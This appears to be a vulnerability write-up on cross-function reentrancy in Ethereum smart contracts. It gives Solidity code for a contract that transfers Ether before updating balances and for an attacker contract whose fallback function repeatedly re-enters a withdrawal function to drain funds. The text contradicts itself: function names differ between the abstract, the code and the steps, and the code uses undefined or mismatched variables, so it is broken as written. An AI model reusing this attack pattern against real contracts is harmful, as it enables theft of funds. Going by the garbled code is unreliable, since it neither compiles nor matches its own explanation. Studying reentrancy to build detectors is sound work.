# Cross_function_reentrancy

## Vendor
Cross-function Reentrancy

## Vulnerability Type
Cross Function Reentrancy Bug

## Abstract
We found a complex but common cross-function attack scenario in Ethereum smart contracts, where an attacker can undesirably reenter a function to steal money. The attack scenario can be abstracted as: (1) given a contract `Vulnerable` containing two transfer functions `getBonus` and `withdraw`, which can transfer Ether (cryptocurrency in Ethreum) to another contract. (2) Once the function `getBonus` of contract `Vulnerable` is called to send some Ether to a contract `Attacker`, the `fallback` function of `Attacker` is automatically invoked. (3) In its `fallback` function, `Attacker` calls function `withdraw`, which will undesirably transfer money to `Attacker` again. While reentrancy exploiting on one single function has been well studied, the cross-function reentrancy has not yet been issued.

## Details
We present a typical example of cross-function reentrancy in the figure below.

<div align=center><img width="520" height="240" src="./images/cross-function.png"/></div>

Contract `Vulnerable` contains two transfer functions `withdrawAll` and `withdrawPortion`, both of the two functions can send Ether to another contract address.
* `withdrawAll` declares a transfer operation, which allows a recipient to claim his/her bonus.
* `withdrawPortion` declares another transfer operation, which allows a recipient to withdraw his/her asset.
```
contract Vulnerable{
  ...
  
  // withdraw all the money
  function withdrawAll(address to) external {
      uint256 amount = balances[msg.sender];
      if (balances[msg.sender] > 0) {
        require(msg.sender.call.value(amount)());
        totalbalance -= _amount;
    	  balances[msg.sender] = 0;
      }
  }
  
  // withdraw part the money
  function withdrawPortion(uint _amount) external {   
     if (balances[msg.sender] >= amount) {
        require(msg.sender.call.value(amount)());
        totalbalance -= _amount;
        userBalances[msg.sender] -= amount;
     }
  }
}
```

Contract `Attacker` contains a `attack` function and a `fallback` function.
* `attack` initiates the first attack to withdraw money by calling the function `withdrawAll`.
* `fallback` calls the function `withdrawPortion` to steal money from contract `Vulnerable`.
```
contract Attacker{
  ...
  
  function attack(){
    vul.withdrawAll(_owner);
  }

  function () payable{ // fallback function
     count++;
     if(count < 10){
       vul.withdrawPortion(1 ether);
     }
  }
}
```


**Step 1** The contract `Attacker` uses the function `attack` to call the function `withdrawAll` to withdraw his/her asset (Ether), aiming to initiate the attack. (attack (Attacker) -> withdrawAll (Vulnerable))

**Step 2** Once the transfer operation of the function `withdrawAll` is invoked (i.e., "require(msg.sender.call.value(amount)());"), it will automatically trigger the `fallback` function of `Attacker`. (withdrawAll (Vulnerable) -> fallback (Attacker))

**Step 3** The `fallback` function of contract `Attacker` maliciously invokes the function `withdraw` of `Vulnerable` to withdraw Ether. (fallback (Attacker) -> withdraw (Vulnerable))

**Step 4** However, the function `withdraw` repeatedly triggers the `fallback` function by executing the transfer operation (i.e., "require(msg.sender.call.value(amount)());"). (withdraw (Vulnerable) -> fallback (Attacker))

**Step 5** Similarly, the `fallback` function re-enters the contract `Vulerable` by calling the function `withdraw` again, causing the recursive calls. By exploiting the reentrant call, the `Attacker` can access the contract `Vulnerable` to steal Ether until all its Ether is exhausted. (fallback (Attacker) -> withdraw (Vulnerable) -> ...)

## Conclusion
Overall, we would like to highlight that this reentrancy situation is common in many Ethereum smart contracts. Attackers can make use of two transfer functions of the vulnerable contract and the `fallback` mechanism to re-enter the vulnerable contract for stealing money. Since reentrancy can occur across multiple functions and current reentrancy detection tools are single function-based, solutions aiming at detecting cross-function reentrancy is urgently required.

## Reference
https://consensys.github.io/smart-contract-best-practices/known_attacks/

https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21

https://github.com/Messi-Q/Vulnerabilities/blob/master/Reentrancy_cross_function.sol

